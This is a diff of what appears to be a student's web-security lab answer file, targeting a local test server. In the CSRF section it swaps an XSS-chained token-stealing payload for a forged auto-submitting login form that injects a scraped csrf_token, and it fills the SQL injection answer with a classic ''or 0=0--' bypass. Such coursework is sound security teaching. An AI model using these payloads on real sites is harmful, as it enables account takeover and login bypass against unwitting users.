@@ -77,16 +77,25 @@ Part 2: Cross-site Request Forgery (CSRF)
 
 
 	2.1) Token validation (with XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=1&xssdefense=0
-        <html>
+
+		<html>
+			TODO
             <head>
                 <title>Safe site</title>
-                <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
             </head>
-            <script type="text/javascript">
-                document.addEventListener("DOMContentLoaded", function(){var url = "http://0.0.0.0:8080/search?q=%3Cscript%3E+document.addEventListener%28%22DOMContentLoaded%22%2C+function+%28%29%7B+var+token+%3D+Cookies.get%28%22csrf_token%22%29%3B++%24.post%28%22http%3A%2F%2F0.0.0.0%3A8080%2Flogin%3Fcsrfdefense%3D0%26xssdefense%3D4%22%2C+%7Busername%3A+%22attacker%22%2C+password%3A+%22URpwn3d%22%2C+csrf_token%3A+token%7D%29%3B%7D%29%3B+%3C%2Fscript%3E+";
-        window.location.href=url; },false);
+            <body>
+                <form id=“fake” action="http://0.0.0.0:8080/login?csrfdefense=0&xssdefense=4" method="POST">
+                    <input id="username" name="username" type="text" value="attacker" required >
+                    <input id="userpass" name="password" type="password" value="URpwn3d" required >
+                </form>
+            </body>
+            <script>
+		            var token = document.querySelector('[name="csrf_token"]').value;
+		            var str = "<input type='hidden' name='csrf_token' value='" + token +"'>";
+	                document.querySelector("#fake").innerHTML += str;
+                    document.getElementById("fake").submit();
             </script>
-        </html>
+		</html>
 
 
 	2.2) [Optional extra credit] Token validation (without XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=&xssdefense=4
@@ -101,8 +110,8 @@ ________________________________________________________________________________
 
 Part 3: SQL Injection
 
-	Username: TODO
-	Password: TODO
+	Username: victim
+	Password: 'or 0=0--
 
 
 ________________________________________________________________________________________
